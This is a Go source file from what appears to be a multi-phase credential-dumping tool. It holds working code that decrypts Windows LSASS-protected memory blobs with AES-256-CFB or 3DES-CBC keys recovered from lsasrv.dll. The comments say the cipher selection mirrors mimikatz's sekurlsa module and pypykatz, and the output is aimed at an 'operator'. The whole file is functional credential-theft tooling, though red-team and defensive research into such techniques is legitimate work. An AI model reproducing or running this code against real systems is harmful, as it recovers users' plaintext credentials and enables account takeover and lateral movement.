package commands

// LsaProtectMemory decryption — Phase 2C-ii-c.
//
// Phase 2C-ii-b Step 1 captured the raw key material lsasrv.dll uses inside
// LsaProtectMemory / LsaUnprotectMemory:
//
//   - 16-byte InitializationVector
//   - 24-byte 3DES key (legacy fallback)
//   - 32-byte AES-256 key (modern path, what Win10/11 emits in practice)
//
// This file uses those bytes to decrypt every ciphertext blob captured by
// Phase 2C-ii-a. Selection between AES and 3DES follows the rule in
// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
// (function kuhl_m_sekurlsa_nt6_LsaEncryptMemory):
//
//	if (cbMemory % 8) { hKey = &kAes.hKey;  cbIV = 16; }   // AES-256-CFB
//	else              { hKey = &k3Des.hKey; cbIV = 8;  }   // 3DES-CBC, IV = first 8 bytes
//
// The AES path uses CFB chaining mode with the BCrypt default feedback size,
// which is the algorithm's full block (16 bytes for AES-256). pypykatz
// (lsa_decryptor_nt6.py) confirms this against production lsasrv: it calls
// `AES(key, MODE_CFB, IV=iv, segment_size=128)` (128 bits = 16 bytes). Go's
// cipher.NewCFBDecrypter implements the same block-sized CFB, so feeding it
// the raw 32-byte AES key + 16-byte IV recovers plaintext byte-for-byte.
//
// The 3DES path uses CBC mode with the first 8 bytes of the stored 16-byte
// IV (cbIV = sizeof(IV)/2 in mimikatz). Block-aligned ciphertext lengths
// (multiples of 8) trigger this path; on Win10/11 it's rarely seen because
// modern PRIMARY_CREDENTIAL_10 layouts have non-block-aligned sizes.

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"fmt"
)

// LsaDecryptAlg labels which cipher decryptLsaProtectedMemory selected. The
// label is surfaced in JSON output so an operator can see which key resolved
// the ciphertext — useful when triaging a tag-invalid key (BCrypt key chain
// drift) vs. legitimate cipher-selection variance across Windows builds.
type LsaDecryptAlg string

const (
	LsaAlgAES256CFB LsaDecryptAlg = "AES-256-CFB"
	LsaAlg3DESCBC   LsaDecryptAlg = "3DES-CBC"
)

const (
	lsaAESKeyLen   = 32 // AES-256
	lsaTDESKeyLen  = 24 // 3DES (3 × 8-byte sub-keys)
	lsaAESIVLen    = 16
	lsaTDESIVLen   = 8 // first 8 bytes of the stored 16-byte IV
	lsaTDESBlockSz = 8
)

// decryptLsaProtectedMemory replicates lsasrv!LsaUnprotectMemory using the
// keys and IV recovered by Phase 2C-ii-b. Returns (plaintext, alg, err).
//
// Selection rule mirrors mimikatz exactly:
//
//   - len(ciphertext) % 8 != 0  → AES-256-CFB (full 16-byte IV, 32-byte key)
//   - len(ciphertext) % 8 == 0  → 3DES-CBC    (first 8 bytes of IV, 24-byte key)
//
// The plaintext slice is always a fresh allocation owned by the caller —
// never aliased with `ciphertext`. The chosen alg is reported even on
// validation failure so the caller can surface it in error JSON.
func decryptLsaProtectedMemory(ciphertext, aesKey, desKey, iv []byte) ([]byte, LsaDecryptAlg, error) {
	if len(ciphertext) == 0 {
		return nil, "", fmt.Errorf("empty ciphertext")
	}

	if len(ciphertext)%lsaTDESBlockSz != 0 {
		// AES-256-CFB path (the modern Win10/11 default).
		if len(aesKey) != lsaAESKeyLen {
			return nil, LsaAlgAES256CFB, fmt.Errorf("invalid AES key length %d (want %d)", len(aesKey), lsaAESKeyLen)
		}
		if len(iv) < lsaAESIVLen {
			return nil, LsaAlgAES256CFB, fmt.Errorf("invalid IV length %d (need %d for AES-CFB)", len(iv), lsaAESIVLen)
		}
		block, err := aes.NewCipher(aesKey)
		if err != nil {
			return nil, LsaAlgAES256CFB, fmt.Errorf("aes.NewCipher: %w", err)
		}
		// Use a fresh copy of the IV — Go's CFB decrypter mutates the IV slice
		// internally on some platforms.
		ivCopy := make([]byte, lsaAESIVLen)
		copy(ivCopy, iv[:lsaAESIVLen])
		out := make([]byte, len(ciphertext))
		stream := cipher.NewCFBDecrypter(block, ivCopy)
		stream.XORKeyStream(out, ciphertext)
		return out, LsaAlgAES256CFB, nil
	}

	// 3DES-CBC path (legacy alignment).
	if len(desKey) != lsaTDESKeyLen {
		return nil, LsaAlg3DESCBC, fmt.Errorf("invalid 3DES key length %d (want %d)", len(desKey), lsaTDESKeyLen)
	}
	if len(iv) < lsaTDESIVLen {
		return nil, LsaAlg3DESCBC, fmt.Errorf("invalid IV length %d (need %d for 3DES-CBC)", len(iv), lsaTDESIVLen)
	}
	block, err := des.NewTripleDESCipher(desKey)
	if err != nil {
		return nil, LsaAlg3DESCBC, fmt.Errorf("des.NewTripleDESCipher: %w", err)
	}
	ivCopy := make([]byte, lsaTDESIVLen)
	copy(ivCopy, iv[:lsaTDESIVLen])
	out := make([]byte, len(ciphertext))
	mode := cipher.NewCBCDecrypter(block, ivCopy)
	mode.CryptBlocks(out, ciphertext)
	return out, LsaAlg3DESCBC, nil
}
